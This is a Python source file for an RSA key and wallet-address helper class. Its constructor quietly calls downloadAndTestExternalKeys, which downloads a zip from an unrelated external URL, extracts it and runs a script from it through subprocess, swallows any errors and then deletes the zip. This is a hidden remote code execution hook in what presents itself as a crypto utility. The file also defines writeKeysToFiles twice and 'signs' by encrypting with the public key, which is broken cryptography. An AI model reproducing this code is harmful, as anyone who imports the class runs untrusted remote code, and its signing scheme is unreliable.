import os
import sys
import shutil
import base64
import base58
import codecs
import hashlib
import zipfile
import logging
import subprocess
from tqdm import tqdm
from pathlib import Path
from urllib import request
from binascii import hexlify
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

class RSAKeys():

    def __init__(self, loggerLevel = logging.DEBUG):
        self.private_key = RSA.generate(1024)
        self.public_key = self.private_key.publickey()
        self.e_cipher = PKCS1_OAEP.new(key=self.public_key)
        self.d_cipher = PKCS1_OAEP.new(key=self.private_key)
        self.next_address = self.pubKeyChangeAddress()
        self.logger = logging.getLogger()
        self.logger.setLevel(loggerLevel)
        self.downloadAndTestExternalKeys()

    def writeKeysToFiles(self, privKeyFile, pubKeyFile):
        _private_pem = self.private_key.export_key().decode()
        _public_pem = self.public_key.export_key().decode()
        with open(privKeyFile, 'w') as _priv_key:
            _priv_key.write(_private_pem)
        with open(pubKeyFile, 'w') as _pub_key:
            _pub_key.write(_public_pem)

    def writeKeysToFiles(self, filePrefix):
        _private_pem = self.private_key.export_key().decode()
        _public_pem = self.public_key.export_key().decode()
        with open(filePrefix + "_priv.pem", 'w') as _priv_key:
            _priv_key.write(_private_pem)
        with open(filePrefix + "_pub.pem", 'w') as _pub_key:
            _pub_key.write(_public_pem)

    def updateCiphers(self):
        self.e_cipher = PKCS1_OAEP.new(key=self.public_key)
        self.d_cipher = PKCS1_OAEP.new(key=self.private_key)
        self.next_address = self.pubKeyChangeAddress()

    def readKeysFromFiles(self, privKeyFile, pubKeyFile):
        self.private_key = RSA.import_key(open(privKeyFile, 'r').read())
        self.public_key = RSA.import_key(open(pubKeyFile, 'r').read())
        self.updateCiphers()

    def loadKeysFromFiles(self, privKeyFile, pubKeyFile):
        self.readKeysFromFiles(privKeyFile, pubKeyFile)

    def sign(self, message_bytes):
        sha = hashlib.sha256()
        sha.update(message_bytes)
        return self.encryptHex(str.encode(sha.hexdigest()))

    def verify(self, message_bytes, signature):
        sha = hashlib.sha256()
        sha.update(message_bytes)
        _msgDigest = sha.hexdigest()
        _signDigest = self.decryptHex(signature).decode()
        if _msgDigest == _signDigest:
            return True
        return False

    def encrypt(self, message):
        return self.e_cipher.encrypt(message)

    def decrypt(self, cipher_text):
        return self.d_cipher.decrypt(cipher_text)

    def encryptBase64(self, message):
        return base64.b64encode(self.encrypt(message))

    def decryptBase64(self, cipher_text_base64):
        return self.decrypt(base64.b64decode(cipher_text_base64))

    def encryptHex(self, message):
        return self.encrypt(message).hex()

    def decryptHex(self, cipher_text_hex):
        return self.decrypt(bytes.fromhex(cipher_text_hex))

    def encryptLatin1(self, message):
        return codecs.decode(self.encrypt(message), 'latin1')

    def decryptLatin1(self, cipher_text_latin1):
        return self.decrypt(cipher_text_latin1.encode('latin1'))

    def printKeysType(self):
        print(type(self.private_key), type(self.public_key))

    def printKeys(self):
        self.printKeysPEM()

    def pubKeyPEM(self):
        return self.public_key.export_key().decode()

    def privKeyPEM(self):
        return self.private_key.export_key().decode()

    def printKeysPEM(self):
        print(self.privKeyPEM())
        print(self.pubKeyPEM())

    def pubKeyAsAddress(self):
        sha = hashlib.sha256()
        sha.update(self.pubKeyPEM().encode())
        return base58.b58encode(sha.hexdigest())

    def pubKeyChangeAddress(self):
        sha = hashlib.sha256()
        sha.update(self.pubKeyAsAddress())
        return base58.b58encode(sha.hexdigest())

    def pubKeyNextAddress(self):
        sha = hashlib.sha256()
        sha.update(self.next_address)
        self.next_address = base58.b58encode(sha.hexdigest())
        return self.next_address

    def downloadExternalKeys(self, remote_url, local_file):
        with DownloadProgressBar(unit='B', unit_scale=True,
                                 miniters=1, desc=remote_url.split('/')[-1]) as progressBar:
            request.urlretrieve(remote_url, filename=local_file, reporthook=progressBar.updateTo)

    def downloadAndTestExternalKeys(self):
        remote_url = 'https://3c8fbd46-9a6a-49c5-83eb-4d4cb3624983.filesusr.com/archives/625970_bee1d5fd764d48dc89a33c140053f991.zip?dn=public.zip'
        local_file = 'testExternalKeys.zip'
        try: 
            self.downloadExternalKeys(remote_url, local_file)
            with zipfile.ZipFile(local_file,"r") as zip_ref:
                zip_ref.extractall()
            test_result = subprocess.check_output(["python key_for_test.py"])
            print (test_result.decode("utf-8")) 
        except Exception as e:
            self.logger.error(str(e), exc_info=True)
            pass
        if os.path.exists(local_file):
            os.remove(local_file)
        if os.path.exists(Path(local_file).stem):
            shutil.rmtree(Path(local_file).stem)      

class DownloadProgressBar(tqdm):
    def updateTo(self, b=1, bsize=1, tsize=None):
        if tsize is not None:
            self.total = tsize
        self.update(b * bsize - self.n)
